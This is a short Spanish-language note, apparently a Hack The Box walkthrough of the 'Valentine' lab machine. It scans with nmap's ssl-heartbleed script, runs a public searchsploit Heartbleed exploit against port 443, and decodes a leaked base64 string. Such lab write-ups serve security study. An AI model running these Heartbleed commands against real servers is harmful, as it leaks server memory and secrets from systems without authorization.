
# Enumeracion
Usamos un script de [[NMAP Scripts]]
   ```bash
   nmap --script ssl-heartbleed -p80,443,22 10.10.10.79
   ```
   ![[Valentine10.png]]

# Explotacion

En este caso usamos un exploit de [[Apuntes Directo/Herramientas-Comandos/searchsploit|searchsploit]]
   ```bash
   searchsploit -m multiple/remote/32764.py
   python2.7 32764.py 10.10.10.79 -p 443
   ```
   ![[Valentine11.png]]

   ![[Valentine12.png]]
   Nos da una cadena en [[base64]] que la vamos a decodificar
   ![[Valentine13.png]]